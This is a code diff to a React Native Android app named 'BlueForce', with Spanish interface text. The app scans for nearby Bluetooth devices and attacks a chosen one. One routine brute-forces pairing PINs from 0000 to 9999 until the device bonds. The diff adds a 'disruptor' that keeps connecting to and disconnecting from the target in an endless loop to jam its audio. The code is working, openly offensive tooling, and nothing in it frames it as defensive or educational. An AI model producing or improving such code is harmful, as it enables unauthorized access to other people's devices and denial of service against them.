@@ -14,10 +14,9 @@ export default function App() {
   const [aliases, setAliases] = useState({});
   const [mode, setMode] = useState('IDLE');
   const [currentPin, setCurrentPin] = useState('0000');
+  const [disruptCount, setDisruptCount] = useState(0); // CONTADOR VISUAL PARA BLOQUEO
   const [logs, setLogs] = useState([]);
   const [isScanning, setIsScanning] = useState(false);
-  
-  // ESTADOS PARA RENOMBRAR (MODAL)
   const [modalVisible, setModalVisible] = useState(false);
   const [tempName, setTempName] = useState('');
   const [renamingAddr, setRenamingAddr] = useState('');
@@ -33,23 +32,14 @@ export default function App() {
           PermissionsAndroid.PERMISSIONS.BLUETOOTH_CONNECT,
           PermissionsAndroid.PERMISSIONS.BLUETOOTH_ADVERTISE,
         ]);
+        addLog("🛡️ BlueForce Armado y Listo.");
       }
     })();
   }, []);
 
-  const scan = async () => {
-    if (isScanning || mode !== 'IDLE') return;
-    setIsScanning(true); setDiscoveredDevices([]);
-    try {
-      const devices = await RNBluetoothClassic.startDiscovery();
-      setDiscoveredDevices(devices.sort((a,b) => b.rssi - a.rssi));
-    } catch (e) { addLog("❌ Error de comunicación."); }
-    finally { setIsScanning(false); }
-  };
-
   const startBruteForce = async (device) => {
     setMode('BRUTE');
-    addLog(`🚀 ATK: ${device.address}`);
+    addLog(`🚀 ATAQUE PIN contra ${device.address}`);
     RNBluetoothClassic.cancelDiscovery(); 
 
     for (let i = 0; i <= 9999; i++) {
@@ -65,93 +55,98 @@ export default function App() {
                 const bonded = await RNBluetoothClassic.getBondedDevices();
                 if (bonded.some(d => d.address === device.address)) {
                     setHistory(prev => ({ ...prev, [device.address]: { status: '🔓 CONQUISTADO', pin } }));
-                    setMode('IDLE'); Alert.alert("ÉXITO", `PIN: ${pin}`); return;
+                    setMode('IDLE'); Alert.alert("ÉXITO", "PIN ENCONTRADO!"); return;
                 }
             }
-        } catch (e) {
-            await new Promise(r => setTimeout(r, 600));
-        }
+        } catch (e) { await new Promise(r => setTimeout(r, 500)); }
     }
     setMode('IDLE');
   };
 
-  const openRename = (addr, current) => {
-    setRenamingAddr(addr);
-    setTempName(current);
-    setModalVisible(true);
-  };
+  const startDisruptor = async (device) => {
+    setMode('DISRUPT');
+    setDisruptCount(0);
+    addLog("🔥 INICIANDO DISRUPCIÓN DE AUDIO...");
+    RNBluetoothClassic.cancelDiscovery();
+    
+    let count = 0;
+    while (true) {
+        let m; setMode(c => { m = c; return c; }); if (m !== 'DISRUPT') break;
+        
+        count++;
+        setDisruptCount(count); // ESTO HARÁ QUE VEAS EL ATAQUE EN TIEMPO REAL
 
-  const saveName = () => {
-    if (tempName) setAliases(p => ({ ...p, [renamingAddr]: tempName.toUpperCase() }));
-    setModalVisible(false);
+        try {
+            // Ráfaga doble: Escaneo + Intento de conexión
+            RNBluetoothClassic.startDiscovery();
+            await RNBluetoothClassic.connectDevice(device.address);
+            await RNBluetoothClassic.disconnectDevice(device.address);
+        } catch (e) {}
+        
+        if (count % 10 === 0) addLog(`⚡ Pulso disruptivo #${count} enviado.`);
+    }
+    addLog("⏹️ Ataque de bloqueo detenido.");
   };
 
   return (
     <View style={styles.container}>
-      <Text style={styles.title}>BlueForce Ghost v8</Text>
+      <Text style={styles.title}>BlueForce Visual War v9</Text>
       
-      {/* VENTANA PARA RENOMBRAR */}
       <Modal visible={modalVisible} transparent={true} animationType="fade">
-        <View style={styles.modalBg}>
-          <View style={styles.modalBody}>
-            <Text style={styles.modalTitle}>ASIGNAR ALIAS</Text>
-            <TextInput 
-                style={styles.input} 
-                value={tempName} 
-                onChangeText={setTempName} 
-                placeholder="Nombre del objetivo..."
-                placeholderTextColor="#666"
-            />
+        <View style={styles.modalBg}><View style={styles.modalBody}>
+            <Text style={styles.modalTitle}>ALIAS TÁCTICO</Text>
+            <TextInput style={styles.input} value={tempName} onChangeText={setTempName} placeholder="Nombre..." placeholderTextColor="#666" />
             <View style={{flexDirection:'row', marginTop: 20}}>
-                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#333'}]} onPress={() => setModalVisible(false)}>
-                    <Text style={styles.bt}>CANCELAR</Text>
-                </TouchableOpacity>
-                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#00f2ff', marginLeft: 10}]} onPress={saveName}>
-                    <Text style={[styles.bt, {color:'#000'}]}>GUARDAR</Text>
-                </TouchableOpacity>
+                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#333'}]} onPress={() => setModalVisible(false)}><Text style={styles.bt}>CANCELAR</Text></TouchableOpacity>
+                <TouchableOpacity style={[styles.mBtn, {backgroundColor:'#00f2ff', marginLeft: 10}]} onPress={() => { if(tempName) setAliases(p=>({...p,[renamingAddr]:tempName.toUpperCase()})); setModalVisible(false); }}><Text style={[styles.bt, {color:'#000'}]}>GUARDAR</Text></TouchableOpacity>
             </View>
-          </View>
-        </View>
+        </View></View>
       </Modal>
 
-      <View style={styles.panel}>
-        <Text style={styles.st}>MODO: {mode}</Text>
-        <Text style={styles.pinText}>{mode === 'IDLE' ? 'READY' : currentPin}</Text>
-        <TouchableOpacity style={styles.scanBtn} onPress={scan} disabled={mode !== 'IDLE'}>
-          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanText}>LOCALIZAR</Text>}
+      <View style={[styles.panel, mode === 'DISRUPT' && { borderColor: '#ff0033', borderWidth: 2 }]}>
+        <Text style={styles.st}>MODO: {mode === 'IDLE' ? 'LISTO' : mode}</Text>
+        <Text style={styles.pinText}>
+          {mode === 'BRUTE' ? currentPin : mode === 'DISRUPT' ? `ATKS: ${disruptCount}` : 'READY'}
+        </Text>
+        <TouchableOpacity style={styles.scanBtn} onPress={async () => {
+             setIsScanning(true); setDiscoveredDevices([]);
+             try { const devs = await RNBluetoothClassic.startDiscovery(); setDiscoveredDevices(devs.sort((a,b)=>b.rssi-a.rssi)); } catch(e){}
+             finally { setIsScanning(false); }
+        }} disabled={mode !== 'IDLE'}>
+          {isScanning ? <ActivityIndicator color="#000" /> : <Text style={styles.scanText}>ESCANEAR ENTORNO</Text>}
         </TouchableOpacity>
       </View>
 
       <FlatList data={discoveredDevices} renderItem={({ item }) => {
-        const h = history[item.address] || { status: '⚪ NUEVO' };
-        const name = aliases[item.address] || item.name || "DESCONOCIDO";
+        const h = history[item.address] || { status: '⚪' };
+        const name = aliases[item.address] || item.name || "N/A";
         const isC = h.status.includes('🔓');
         return (
           <View style={styles.card}>
             <SignalMeter rssi={item.rssi} />
-            <TouchableOpacity style={{ flex: 1, marginLeft: 15 }} onPress={() => openRename(item.address, name)}>
+            <TouchableOpacity style={{ flex: 1, marginLeft: 15 }} onPress={() => { setRenamingAddr(item.address); setTempName(name); setModalVisible(true); }}>
               <Text style={styles.name}>{name}</Text>
               <Text style={styles.mac}>{item.address} | {h.status}</Text>
             </TouchableOpacity>
             <View style={{ flexDirection: 'row' }}>
-              <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}>
-                <Text style={styles.bt}>{isC ? 'RE-CON' : 'ATK'}</Text>
-              </TouchableOpacity>
+              <TouchableOpacity style={styles.btn} onPress={() => startBruteForce(item)} disabled={mode !== 'IDLE'}><Text style={styles.bt}>PIN</Text></TouchableOpacity>
+              <TouchableOpacity style={[styles.btn,{backgroundColor:'#ff0033', marginLeft: 5}]} onPress={() => startDisruptor(item)} disabled={mode !== 'IDLE'}><Text style={styles.bt}>!BUG</Text></TouchableOpacity>
             </View>
           </View>
         );
       }} />
       <ScrollView style={styles.logs}>{logs.map((l, i) => <Text key={i} style={styles.lt}>{l}</Text>)}</ScrollView>
+      {mode !== 'IDLE' && <TouchableOpacity style={styles.stop} onPress={()=>setMode('IDLE')}><Text style={styles.stopT}>DETENER OPERACIÓN</Text></TouchableOpacity>}
     </View>
   );
 }
 
 const styles = StyleSheet.create({
   container: { flex: 1, backgroundColor: '#000', padding: 20, paddingTop: 40 },
-  title: { color: '#00f2ff', fontSize: 20, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
-  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 20, borderBottomWidth: 3, borderBottomColor: '#00f2ff' },
+  title: { color: '#00f2ff', fontSize: 18, fontWeight: 'bold', textAlign: 'center', marginBottom: 20 },
+  panel: { backgroundColor: '#111', padding: 20, borderRadius: 15, marginBottom: 15 },
   st: { color: '#444', fontSize: 10, textAlign: 'center' },
-  pinText: { color: '#fff', fontSize: 50, fontWeight: 'bold', textAlign: 'center', marginBottom: 10 },
+  pinText: { color: '#fff', fontSize: 50, fontWeight: 'bold', textAlign: 'center', marginBottom: 12, fontFamily: 'monospace' },
   scanBtn: { backgroundColor: '#00f2ff', padding: 15, borderRadius: 10, alignItems: 'center' },
   scanText: { color: '#000', fontWeight: 'bold' },
   card: { backgroundColor: '#151a22', padding: 15, borderRadius: 12, marginBottom: 10, flexDirection: 'row', alignItems: 'center' },
@@ -164,8 +159,11 @@ const styles = StyleSheet.create({
   logs: { height: 80, backgroundColor: '#0a0a0a', padding: 10, borderRadius: 10 },
   lt: { color: '#333', fontSize: 8 },
   modalBg: { flex: 1, backgroundColor: 'rgba(0,0,0,0.8)', justifyContent: 'center', alignItems: 'center' },
-  modalBody: { backgroundColor: '#111', padding: 25, borderRadius: 20, width: '80%', borderWith: 1, borderColor: '#333' },
+  modalBody: { backgroundColor: '#111', padding: 25, borderRadius: 20, width: '80%' },
   modalTitle: { color: '#00f2ff', fontWeight: 'bold', marginBottom: 15 },
   input: { backgroundColor: '#222', color: '#fff', padding: 10, borderRadius: 10 },
-  mBtn: { padding: 12, borderRadius: 10, flex: 1, alignItems: 'center' }
+  mBtn: { padding: 12, borderRadius: 10, flex: 1, alignItems: 'center' },
+  stop: { backgroundColor: '#ff0033', padding: 18, borderRadius: 12, alignItems: 'center', marginTop: 10 },
+  stopT: { color: '#fff', fontWeight: 'bold' }
 });
+
